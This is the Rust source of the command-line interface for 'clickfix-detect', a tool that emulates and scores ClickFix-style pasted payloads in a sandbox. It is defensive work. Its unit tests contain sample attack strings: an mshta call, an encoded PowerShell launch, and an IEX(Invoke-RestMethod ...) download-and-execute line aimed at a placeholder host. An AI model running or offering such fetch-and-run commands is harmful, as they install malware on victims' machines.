use clap::{Parser, ValueEnum};
use clickfix_detect::{
    render_human, AnalysisReport, Detector, DetectorInput, InputKind, SafeSourcePolicy,
};
use emulator_core::{AnalysisLimits, NetworkPolicy};
use rustyline::{error::ReadlineError, DefaultEditor};
use std::io::{self, BufRead, IsTerminal, Read};
use std::path::PathBuf;

#[derive(Debug, Parser)]
#[command(
    name = "clickfix-detect",
    about = "Hermetically emulate and score ClickFix-style payloads"
)]
struct Arguments {
    /// Input supplied directly on the command line.
    #[arg(value_name = "INPUT", conflicts_with = "file")]
    input: Option<String>,

    /// Read input from this file. File access occurs before emulation.
    #[arg(long, short)]
    file: Option<PathBuf>,

    /// Interpret the input as a command or a `PowerShell` script.
    #[arg(long, value_enum, default_value = "auto")]
    kind: CliInputKind,

    /// Select human-readable or JSON output.
    #[arg(long, value_enum, default_value = "human")]
    format: OutputFormat,

    /// Maximum emulation steps.
    #[arg(long, default_value_t = 20_000)]
    max_steps: usize,

    /// Maximum recursive execution depth.
    #[arg(long, default_value_t = 12)]
    max_depth: usize,

    /// Allow real outbound public HTTP(S) requests with SSRF and size limits.
    #[arg(long)]
    allow_network: bool,

    /// Trust one exact source URL. May be specified repeatedly.
    #[arg(long, value_name = "URL")]
    safe_source: Vec<String>,

    /// Trust a URL path prefix on the same scheme, host, and port. May be repeated.
    #[arg(long, value_name = "URL_PREFIX")]
    safe_source_prefix: Vec<String>,

    /// Disable the built-in safe source URL list.
    #[arg(long)]
    no_default_safe_sources: bool,

    /// Force interactive analysis mode, including when standard input is piped.
    #[arg(short = 'i', long, conflicts_with_all = ["input", "file"])]
    interactive: bool,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
enum CliInputKind {
    Auto,
    Command,
    Powershell,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
enum OutputFormat {
    Human,
    Json,
}

fn main() {
    if let Err(error) = run() {
        eprintln!("clickfix-detect: {error}");
        std::process::exit(2);
    }
}

fn run() -> Result<(), Box<dyn std::error::Error>> {
    let arguments = Arguments::parse();
    if arguments.interactive
        || (arguments.input.is_none() && arguments.file.is_none() && io::stdin().is_terminal())
    {
        return run_interactive(&arguments);
    }

    let (content, path) = read_input(&arguments)?;
    let kind = select_kind(arguments.kind, &content, path.as_ref());
    let detector = create_detector(&arguments)?;
    let report = detector.analyze(DetectorInput { kind, content })?;
    print_report(&report, arguments.format, false)?;
    Ok(())
}

fn create_detector(arguments: &Arguments) -> Result<Detector, io::Error> {
    let detector = Detector::new(AnalysisLimits {
        max_steps: arguments.max_steps,
        max_depth: arguments.max_depth,
        ..AnalysisLimits::default()
    });
    let detector = if arguments.allow_network {
        detector.with_network_policy(NetworkPolicy::public_http())
    } else {
        detector
    };
    let mut safe_sources = if arguments.no_default_safe_sources {
        SafeSourcePolicy::empty()
    } else {
        SafeSourcePolicy::default()
    };
    for url in &arguments.safe_source {
        safe_sources
            .add_exact_url(url)
            .map_err(|error| io::Error::new(io::ErrorKind::InvalidInput, error))?;
    }
    for prefix in &arguments.safe_source_prefix {
        safe_sources
            .add_url_prefix(prefix)
            .map_err(|error| io::Error::new(io::ErrorKind::InvalidInput, error))?;
    }
    Ok(detector.with_safe_source_policy(safe_sources))
}

fn print_report(
    report: &AnalysisReport,
    format: OutputFormat,
    interactive: bool,
) -> Result<(), serde_json::Error> {
    match format {
        OutputFormat::Human if interactive => println!("{}", render_human(report)),
        OutputFormat::Human => print!("{}", render_human(report)),
        OutputFormat::Json if interactive => println!("{}", serde_json::to_string(report)?),
        OutputFormat::Json => println!("{}", serde_json::to_string_pretty(report)?),
    }
    Ok(())
}

fn run_interactive(arguments: &Arguments) -> Result<(), Box<dyn std::error::Error>> {
    let detector = create_detector(arguments)?;
    if io::stdin().is_terminal() {
        run_terminal_interactive(arguments, &detector)
    } else {
        run_stream_interactive(arguments, &detector)
    }
}

fn run_terminal_interactive(
    arguments: &Arguments,
    detector: &Detector,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut editor = DefaultEditor::new()?;
    let mut buffer = String::new();
    loop {
        let prompt = if buffer.is_empty() {
            "clickfix> "
        } else {
            "       > "
        };
        match editor.readline(prompt) {
            Ok(line) => match accept_interactive_line(&line, &mut buffer) {
                ReplAction::Continue => {}
                ReplAction::Help => print_interactive_help(),
                ReplAction::Exit => break,
                ReplAction::Evaluate => {
                    let entry = buffer.trim_end().to_owned();
                    if !entry.is_empty() {
                        editor.add_history_entry(&entry)?;
                    }
                    evaluate_interactive(arguments, detector, &buffer);
                    buffer.clear();
                }
            },
            Err(ReadlineError::Interrupted) => buffer.clear(),
            Err(ReadlineError::Eof) => {
                if !buffer.trim().is_empty() {
                    evaluate_interactive(arguments, detector, &buffer);
                }
                break;
            }
            Err(error) => return Err(error.into()),
        }
    }
    Ok(())
}

fn run_stream_interactive(
    arguments: &Arguments,
    detector: &Detector,
) -> Result<(), Box<dyn std::error::Error>> {
    let stdin = io::stdin();
    let mut input = stdin.lock();
    let mut buffer = String::new();
    loop {
        let mut line = String::new();
        if input.read_line(&mut line)? == 0 {
            if !buffer.trim().is_empty() {
                evaluate_interactive(arguments, detector, &buffer);
            }
            break;
        }
        match accept_interactive_line(&line, &mut buffer) {
            ReplAction::Continue => {}
            ReplAction::Help => print_interactive_help(),
            ReplAction::Exit => break,
            ReplAction::Evaluate => {
                evaluate_interactive(arguments, detector, &buffer);
                buffer.clear();
            }
        }
    }
    Ok(())
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReplAction {
    Continue,
    Help,
    Exit,
    Evaluate,
}

fn accept_interactive_line(line: &str, buffer: &mut String) -> ReplAction {
    let trimmed = line.trim();
    if buffer.is_empty() && matches_ignore_ascii_case(trimmed, &["exit", "quit", ":exit", ":quit"])
    {
        return ReplAction::Exit;
    }
    if buffer.is_empty() && trimmed.eq_ignore_ascii_case(":help") {
        return ReplAction::Help;
    }
    buffer.push_str(line);
    if !line.ends_with('\n') {
        buffer.push('\n');
    }
    if input_is_complete(buffer) {
        ReplAction::Evaluate
    } else {
        ReplAction::Continue
    }
}

fn input_is_complete(input: &str) -> bool {
    let mut quote = None;
    let mut escaped = false;
    let mut parentheses = 0_i32;
    let mut brackets = 0_i32;
    let mut braces = 0_i32;
    for character in input.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        if matches!(character, '`' | '^') {
            escaped = true;
            continue;
        }
        if let Some(delimiter) = quote {
            if character == delimiter {
                quote = None;
            }
            continue;
        }
        match character {
            '\'' | '"' => quote = Some(character),
            '(' => parentheses += 1,
            ')' => parentheses -= 1,
            '[' => brackets += 1,
            ']' => brackets -= 1,
            '{' => braces += 1,
            '}' => braces -= 1,
            _ => {}
        }
    }
    let trimmed = input.trim_end();
    quote.is_none()
        && parentheses <= 0
        && brackets <= 0
        && braces <= 0
        && !trimmed.ends_with(['`', '^'])
}

fn evaluate_interactive(arguments: &Arguments, detector: &Detector, content: &str) {
    let kind = select_kind(arguments.kind, content, None);
    match detector.analyze(DetectorInput {
        kind,
        content: content.to_owned(),
    }) {
        Ok(report) => {
            if let Err(error) = print_report(&report, arguments.format, true) {
                eprintln!("clickfix-detect: {error}");
            }
        }
        Err(error) => eprintln!("clickfix-detect: {error}"),
    }
}

fn print_interactive_help() {
    println!(
        "Enter one payload per submission. Use multiline quotes or brackets when needed.\n\
         Commands: :help, exit, quit, :exit, :quit. Ctrl-C cancels input; Ctrl-D exits."
    );
}

fn matches_ignore_ascii_case(value: &str, candidates: &[&str]) -> bool {
    candidates
        .iter()
        .any(|candidate| value.eq_ignore_ascii_case(candidate))
}

fn read_input(arguments: &Arguments) -> Result<(String, Option<PathBuf>), io::Error> {
    if let Some(path) = &arguments.file {
        return std::fs::read_to_string(path).map(|content| (content, Some(path.clone())));
    }
    if let Some(input) = &arguments.input {
        return Ok((input.clone(), None));
    }
    let mut input = String::new();
    io::stdin().read_to_string(&mut input)?;
    Ok((input, None))
}

fn select_kind(kind: CliInputKind, content: &str, path: Option<&PathBuf>) -> InputKind {
    match kind {
        CliInputKind::Command => InputKind::RawCommand,
        CliInputKind::Powershell => InputKind::PowerShellScript,
        CliInputKind::Auto => infer_kind(content, path),
    }
}

fn infer_kind(content: &str, path: Option<&PathBuf>) -> InputKind {
    if path.is_some_and(|path| {
        path.extension()
            .is_some_and(|extension| extension.eq_ignore_ascii_case("ps1"))
    }) {
        return InputKind::PowerShellScript;
    }
    let lowercase = content.to_ascii_lowercase();
    if content.contains('\n')
        || content.trim_start().starts_with('$')
        || lowercase.contains("invoke-webrequest")
        || lowercase.contains("invoke-expression")
        || lowercase.contains("set-content")
        || lowercase.contains("[system.")
        || lowercase.contains("[text.")
    {
        InputKind::PowerShellScript
    } else {
        InputKind::RawCommand
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rustyline::history::{History, SearchDirection};

    #[test]
    fn line_editor_retains_history() {
        let mut editor = DefaultEditor::new().unwrap();
        editor
            .add_history_entry("mshta https://example.invalid")
            .unwrap();
        editor
            .add_history_entry("powershell.exe -enc QQ==")
            .unwrap();
        let result = editor
            .history()
            .search("power", 1, SearchDirection::Reverse)
            .unwrap()
            .unwrap();
        assert_eq!(result.entry.as_ref(), "powershell.exe -enc QQ==");
    }

    #[test]
    fn multiline_input_waits_for_balanced_delimiters() {
        assert!(!input_is_complete(
            "powershell.exe -c \"IEX (\nInvoke-RestMethod 'https://example.invalid'\n"
        ));
        assert!(input_is_complete(
            "powershell.exe -c \"IEX (\nInvoke-RestMethod 'https://example.invalid'\n)\"\n"
        ));
    }
}
